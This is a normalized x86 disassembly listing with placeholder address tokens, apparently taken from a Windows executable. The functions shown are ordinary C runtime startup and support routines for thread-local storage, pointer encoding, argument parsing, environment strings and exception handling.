pop esi
retn
sub_42638b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_4263a8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_4263cc
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
push 0x16
pop eax
pop ebp
retn
mov [ ecx ] eax
xor eax eax
pop ebp
retn
sub_4263fc
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
push 0x16
pop eax
pop ebp
retn
mov [ ecx ] eax
xor eax eax
pop ebp
retn
sub_42642c
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_42b32d
push r--data
push r--data
call sub_4263a8
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_42b3e0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_427897
call sub_42606a
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_42b3e0
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_4264c3
push 0x20
push r--data
call sub_4278c0
push 0x8
call sub_42b166
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4265ee
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_427905
retn
mov [ rw-data ] 0x1
push 0x8
call sub_42b075
pop ecx
push [ ebp + 0x8 ]
call sub_42632e
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_426a4c
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_426a4c
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_42666b
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_426691
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_42666b
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
push 0x3
call sub_42ac24
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_42ac24
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_42abc1
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_427be0
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_4296a0
push esi
call sub_42ab31
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_42abc1
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_42ab4c
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_42ab31
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_42aa64
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_42ab4c
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_42a585
add esp 0xc
jmp r-xdata
sub_426840
push 0x3
call sub_42ac24
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_426691
push 0xff
call sub_426691
pop ecx
pop ecx
push 0x3
call sub_42ac24
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_4268b1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_426919
mov edi edi
push ebp
mov ebp esp
push esi
call sub_426906
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_4268b1
pop ecx
mov esi eax
call sub_4268f3
mov [ eax ] esi
pop esi
pop ebp
retn
sub_42693c
mov edi edi
push ebp
mov ebp esp
call sub_426bc0
test eax eax
jne r-xdata
call sub_4268f3
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
push 0xc
pop eax
pop ebp
retn
sub_42695d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
call sub_4268f3
mov eax [ eax ]
mov [ esi ] eax
xor eax eax
call sub_42970c
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_426982
mov edi edi
push ebp
mov ebp esp
call sub_426bc0
test eax eax
jne r-xdata
call sub_426906
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
push 0xc
pop eax
pop ebp
retn
sub_4269a3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
call sub_426906
mov eax [ eax ]
mov [ esi ] eax
xor eax eax
call sub_42970c
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_4269d7
mov edi edi
push ebp
mov ebp esp
push esi
push 0x4
call sub_42b166
pop ecx
push [ rw-data ]
call [ DecodePointer@IAT ]
push [ ebp + 0x8 ]
mov esi eax
call [ EncodePointer@IAT ]
push 0x4
mov [ rw-data ] eax
call sub_42b075
pop ecx
mov eax esi
pop esi
pop ebp
retn
sub_426a24
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_426a7e
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_426acf
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp sub_42b01e
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_426b0c
push 0x8
push r--data
call sub_4278c0
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_42b166
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_426bae
push 0xc
call sub_42b166
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_4291fb
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_426bb7
call sub_427905
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_426bc0
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_426a7e
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_42acf2
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_42578a
pop ecx
xor esi esi
push 0x0
push esi
call sub_426b0c
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_426c53
push 0x8
push r--data
call sub_4278c0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_427905
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_42578a
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_42578a
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_42578a
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_42578a
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_42578a
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_42578a
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_42578a
pop ecx
push 0xd
call sub_42b166
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_42578a
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_426d6d
push 0xc
call sub_42b166
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_426d79
push esi
call sub_42578a
pop ecx
push edi
call sub_42928a
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_42578a
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_429323
pop ecx
sub_426d82
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
push [ ebp + 0x8 ]
call sub_426c53
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_426dfc
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_426acf
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_426a55
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_426358
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_42afd4
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_426acf
mov edi [ DecodePointer@IAT ]
push sub_426c53
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_42acf2
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_426b0c
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_426f77
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_426fc3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_42b199
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_427013
mov eax ecx
push esi
add ecx 0x90
pop esi
cmp eax ecx
jae r-xdata
add eax 0xc
lea esi [ ecx + 0x90 ]
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
retn
sub_427039
mov edi edi
push ebp
mov ebp esp
push esi
call sub_426bc0
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_427183
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_427039
pop ecx
pop ecx
pop ebp
retn
sub_4271a3
mov edi edi
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
call sub_42bc38
mov al [ esi ]
cmp al 0x20
ja r-xdata
mov esi r--data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movzx eax al
push eax
call sub_42be62
pop ecx
test eax eax
je r-xdata
xor ecx ecx
test edi edi
sete cl
mov edi ecx
pop edi
mov eax esi
pop esi
retn
test edi edi
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x20
ja r-xdata
inc esi
sub_427202
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_42bc38
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_42acf2
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_427be0
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_427be0
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_42578a
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_42acf2
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_42578a
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_427b7a
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_4296a0
int3
add edi 0x4
sub_4272ed
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_42be62
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_42be62
pop ecx
test eax eax
je r-xdata
call sub_42be62
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_427487
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_42bc38
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_4272ed
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_42acad
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_4272ed
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_427542
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_42acad
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_42578a
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_4275d9
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_42acf2
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
